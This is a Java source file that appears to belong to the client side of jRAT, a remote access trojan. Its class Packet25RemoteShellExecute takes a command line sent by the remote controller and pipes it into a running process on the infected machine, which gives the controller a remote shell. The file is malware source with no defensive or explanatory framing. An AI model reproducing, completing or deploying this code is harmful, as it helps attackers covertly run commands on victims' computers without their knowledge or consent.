package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.LaunchProcess;
import java.io.PrintWriter;


public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String line = con.readLine();
		
		PrintWriter input = new PrintWriter(LaunchProcess.getLatest().getProcess().getOutputStream(), true);
		input.println(line);
	}

}
